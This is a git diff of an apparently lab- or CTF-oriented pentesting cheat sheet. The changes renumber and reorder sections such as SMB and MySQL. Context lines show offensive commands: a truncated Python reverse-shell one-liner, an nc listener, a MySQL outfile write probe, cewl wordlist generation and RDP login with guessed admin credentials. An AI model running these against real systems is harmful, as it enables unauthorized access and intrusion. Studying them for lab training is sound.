@@ -14,7 +14,7 @@
 > - `find . -name user.txt -exec wc -c {} \; -exec cat {} \;`
 > - `find / -iname root.txt -exec wc {} \;`
 > - ``` find -type d -name ".*" 2>/dev/null``` it will check hidden directories.
-- [Linux Forensics](/linux_forensics.md)
+
 - [Useful_links](/links.md)
 - [0. Service Port](/port.md)
 - [1. Nmap](#nmap)
@@ -25,18 +25,20 @@
 - [5.FTP](#ftp)
 - [6. SSH](#ssh)
 - [7. shell upgreade](#shell)
-- [8. Mysql](#mysql)
-- [9. Cewl](#cewl) - It is use to create a worldlist using website link
+- [8. SMB](/smb.md)
+- [9. Mysql](#mysql)
+- [10. Cewl](#cewl) - It is use to create a worldlist using website link
 - [12. Post-Exploit Enumeration](#post)
 - [13. Password Cracking](/hash_cracking.md)
 - [14. RDP-3389](#rdp)
-- [15. SMB](/smb.md)
+
 - [16. Metasploit](/metasploit.md)
 - [18. Reverse_Shell_Script](#rev)
 - [19. Privilege escalation](/Privilege.md)
 - [20. Email Harversting with theHarvester](#email)
 - [21. Simple Local Web Servers](#localweb)
 - [22. BurpSuite](/burpsuite.md)
+- [Linux Forensics](/linux_forensics.md)
 # Windows
 - [I. certutil](#certutil)
 - [II. Mimikatz](/Notes/mimi.md)
@@ -216,11 +218,11 @@ echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STR
 - __`nc -lnvp 31337`__
 - 
 
+# [8. SMB](/smb.md)
 
 
 
-
-# 8. Mysql <a name="mysql"></a>
+# 9. Mysql <a name="mysql"></a>
 - `mysql -h 10.0.1.22 -u root`
     - select 'This is a test' into outfile '/tmp/test' from mysql.user limit 1;
       - > if executed, confirms the ability to write files on the web server.
@@ -235,7 +237,7 @@ echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STR
 
 
 
-# 9. Cewl <a name="cewl"></a>
+# 10. Cewl <a name="cewl"></a>
 - ```cewl -w passwords.txt http://192.168.245.48:1898/?q=node/1```
 
 
@@ -281,7 +283,7 @@ exploit
 - __`xfreerdp /u:administrator /p:password123 /v:<targetip>`__
 
 
-# [14. SMB](/smb.md)
+
 
 
 
